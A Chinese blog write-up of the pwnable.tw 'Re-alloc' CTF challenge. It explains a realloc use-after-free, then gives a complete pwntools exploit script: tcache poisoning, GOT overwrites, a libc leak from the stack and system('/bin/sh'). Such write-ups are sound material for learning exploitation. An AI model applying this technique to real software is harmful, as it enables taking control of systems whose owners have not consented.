---
layout: post
title: pwnable.tw Re-alloc
date: 2023-04-13 23:03:41
tags: pwnable.tw
---

相关：realloc、tcache2.29

借用了很多巧合，实在是特别“幸运”的一个利用，和大部分网上的解法都不太一样。

## 漏洞分析

保护情况：

```sh
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    FORTIFY:  Enabled
```

程序是一个菜单，提供了alloc、realloc、free功能，来操作bss段的两个栏位，大致功能如下：

- alloc：选中栏当前为NULL时，使用 realloc(NULL, size) 分配新的区块并读入数据；
- realloc：选中栏当前非NULL时，将选中栏使用 realloc(ptr, size) 来调整大小并（如果realloc返回值非0）读入数据；
- free：将选中栏使用 realloc(ptr, 0) 进行释放，并**将指针置零**。

主要的漏洞在于realloc的使用上，可以通过RTFM（在线man地址：[realloc(3): allocate/free dynamic memory - Linux man page](https://linux.die.net/man/3/realloc)）得到realloc的说明：

> The **realloc**() function changes the size of the memory block pointed to by _ptr_ to _size_ bytes. The contents will be unchanged in the range from the start of the region up to the minimum of the old and new sizes. If the new size is larger than the old size, the added memory will _not_ be initialized. If _ptr_ is NULL, then the call is equivalent to _malloc(size)_, for all values of _size_; if _size_ is equal to zero, and _ptr_ is not NULL, then the call is equivalent to _free(ptr)_. Unless _ptr_ is NULL, it must have been returned by an earlier call to **malloc**(), **calloc**() or **realloc**(). If the area pointed to was moved, a _free(ptr)_ is done.

注意到，当ptr字段为0，realloc等价于malloc；当ptr不为0但size为0时，realloc等价于free。

程序确实使用这两种功能来实现了malloc以及free，但是在realloc和free功能中，检查做得不够完善：

- 当realloc中输入size为0，可以**触发free，且不将原指针置零**，创造了UAF的可能。
- 使用free作用于空栏位（NULL），可以触发一次匿名的malloc(0)。这里的匿名指的是结果不会保存在bss段结构中，因为free会将其置零。

其实另外还在alloc功能中发现了一个Off-by-NULL漏洞，但我并没有想到很好的办法来用到这个漏洞。

## Exploitation

在宏观的层面上，由于程序二进制本身虽然关闭了PIE，但没有特别有用的函数，因此思路还是两步走：泄露libc地址、劫持控制流。

### 泄露libc地址

程序本身并没有能够提供打印区块数据的功能，因此想要泄露libc数据就一定需要劫持控制流。
目前，栈地址未知排除ROP，将目标瞄准GOT：

```txt
off_404018 dq offset _exit  
off_404020 dq offset __read_chk
off_404028 dq offset puts
off_404030 dq offset __stack_chk_fail
off_404038 dq offset printf
off_404040 dq offset alarm
off_404048 dq offset atoll
off_404050 dq offset signal
off_404058 dq offset realloc
off_404060 dq offset setvbuf
off_404068 dq offset __isoc99_scanf
```

首先思考可不可以把唯一操作区块的外部函数——realloc替换为puts来泄露地址，笔者这时顾忌到题目限制了区块大小，不太方便构造 unsorted bin 中的区块。
因此将目标瞄准了atoll，这个函数在read_long中被调用，参数是栈上用来读入数字的buffer。可以尝试用它来泄露栈上的数据。

这时一个好主意是使用plt\[printf]代替atoll，这样就可以在栈上指哪打哪，可惜笔者做的时候并没有想到这个好主意，只是用了plt\[puts]。不过不影响，因为我遇到了第一个逆天的巧合：**在buffer+8的位置就有一个libc地址**。先介绍一下怎么覆写的：

```python
alloc(0, 0x18, b"victim")
realloc_free(0)
realloc(0, 0x18, pack(elf.got["atoll"]))
free(1)     # alloc a anonymous 0x20 chunk
alloc(1, 0x18, pack(elf.plt["puts"])+pack(0)+pack(0x4015DC))
```

第一行创建了一个0x20大小区块，第二行将其释放进入tcache，同时保留了这个指针。
第三行使用了realloc，realloc发现这个区块大小正常就直接放行了，从而我们可以覆盖fd指针为got\[atoll]。
第四行使用free的漏洞来申请一个匿名区块，分配完之后再下一个区块就是atoll了。
第五行将atoll覆盖为plt\[puts]，并顺便把realloc覆盖为一个普通 `ret` 的地址，原因后面再说。

*这里需要提一嘴，我使用了匿名区块来解决这一问题：非0的栏位无法进行alloc。不过在复盘时，从网上的大佬那边发现可以通过一种非常巧妙的方式来将栏位置零，同时又不干扰已经位于tcache中的atoll地址，从而将后续利用流程也变得直观一些。
可以通过realloc将区块变大，然后再free。这样就可以free到别的大小的tcache中，并且根本不用关注key的检查，也不会将atoll的地址覆盖，一举两得。
参考地址见[Binary Exploitation [pwnable.tw] - Realloc - Tainted Bits](https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/)*

接下来泄露libc地址，由于buffer+8就有，因此简简单单就可以泄露了：

```python
io.recvuntil(b"choice: ")
io.sendline(b"1")
io.recvuntil(b"Index:")
io.sendline(b"1111111\n")   # just padding
io.recvuntil(b"1111111\n")
libc_base = unpack(io.recvuntil(b'\x7f')+b'\0\0')-0x1e570a
success("libc_base: "+hex(libc_base))
```

### 攻击！

目标是 get shell，由于之前已经有了指向GOT的指针（栏位1中），所以我们想办法利用realloc中最后的那个read_input函数来再次修改GOT。
但由于realloc在中间会调用realloc（废话），直接让他realloc一个GOT中的区块大概率是要出问题的，而且程序会往realloc的返回值中读入数据。因此我们需要想一个办法让realloc调用返回之后，rax是GOT中区块的地址。

静态分析一波，并没有发现什么 `mov rax, rdi; ret;` 的gadget，难道我的方法走不下去了吗？于是动态分析一波，惊喜地发现 **程序在调用realloc之前，rax中就已经是GOT中区块地地址了**，令人不得不感叹 ~~大自然~~ 出题人的鬼斧神工。

所以就有了上面把realloc覆盖为一个简单的 `ret` 。这样一来，在执行了下面几句代码后，atoll就会变成system的地址（**注意注释**，很重要）：

```python
io.recvuntil(b"choice: ")
io.sendline(b"2")
io.recvuntil(b"Index:")
io.sendline(b'\0')          # now atoll is puts, so puts("\0") = 1
io.recvuntil(b"Size:")
io.sendline(b"1111111\0")   # now atoll is puts, so puts("1111111\0") = 8
# we have hijacked realloc to 'ret', and when call realloc, rax has been same as rdi (which is really coincident)
# so program just pass and execute read_input(heap[v1], size)
io.sendline(pack(libc_base+libc.symbols["system"]))
```

最后，我们随便触发一个read_long，输入/bin/sh，就可以成功 get shell！当然，也可以直接输入 `cat ~/flag`，如果您需要节省时间的话。

```python
io.recvuntil(b"choice: ")
io.sendline(b"1")
io.recvuntil(b"Index:")
io.sendline(b"/bin/sh\0")
```

### 完整脚本

```python
def alloc(id, size, data):
    io.recvuntil(b"choice: ")
    io.sendline(b"1")
    io.recvuntil(b"Index:")
    io.sendline(str(id).encode("ascii"))
    io.recvuntil(b"Size:")
    io.sendline(str(size).encode("ascii"))
    io.recvuntil(b"Data:")
    io.send(data)

def realloc(id, size, data):
    io.recvuntil(b"choice: ")
    io.sendline(b"2")
    io.recvuntil(b"Index:")
    io.sendline(str(id).encode("ascii"))
    io.recvuntil(b"Size:")
    io.sendline(str(size).encode("ascii"))
    io.recvuntil(b"Data:")
    io.send(data)

def realloc_free(id):
    io.recvuntil(b"choice: ")
    io.sendline(b"2")
    io.recvuntil(b"Index:")
    io.sendline(str(id).encode("ascii"))
    io.recvuntil(b"Size:")
    io.sendline(b"0")

def free(id):
    io.recvuntil(b"choice: ")
    io.sendline(b"3")
    io.recvuntil(b"Index:")
    io.sendline(str(id).encode("ascii"))


def pwn():

    # ---------- leak libc ----------

    # 1.1 hijack GOT[atoll] to PLT[puts], GOT[realloc] to 'ret'

    alloc(0, 0x18, b"victim")
    realloc_free(0)
    realloc(0, 0x18, pack(elf.got["atoll"]))
    free(1)     # alloc a anonymous 0x20 chunk
    alloc(1, 0x18, pack(elf.plt["puts"])+pack(0)+pack(0x4015DC))

    # 1.2 leak libc load address (from stack)

    io.recvuntil(b"choice: ")
    io.sendline(b"1")
    io.recvuntil(b"Index:")
    io.sendline(b"1111111\n")   # just padding
    io.recvuntil(b"1111111\n")
    libc_base = unpack(io.recvuntil(b'\x7f')+b'\0\0')-0x1e570a
    success("libc_base: "+hex(libc_base))

    # ---------- hijack GOT ----------

    # 2.1 hijack GOT[atoi] to libc[system]

    io.recvuntil(b"choice: ")
    io.sendline(b"2")
    io.recvuntil(b"Index:")
    io.sendline(b'\0')          # now atoll is puts, so puts("\0") = 1
    io.recvuntil(b"Size:")
    io.sendline(b"1111111\0")   # now atoll is puts, so puts("1111111\0") = 8
    # we have hijacked realloc to 'ret', and when call realloc, rax has been same as rdi (which is really coincident)
    # so program just pass and execute read_input(heap[v1], size)
    io.sendline(pack(libc_base+libc.symbols["system"]))

    # 2.2 trigger system("/bin/sh") by atoi("/bin/sh")

    io.recvuntil(b"choice: ")
    io.sendline(b"1")
    io.recvuntil(b"Index:")
    io.sendline(b"/bin/sh\0")
    
    success("Enjoy your shell!")
    io.interactive()
    
```

这个故事告诉我们：涉及内存安全的函数还是要小心小心再小心，仔细阅读手册、了解边界行为……
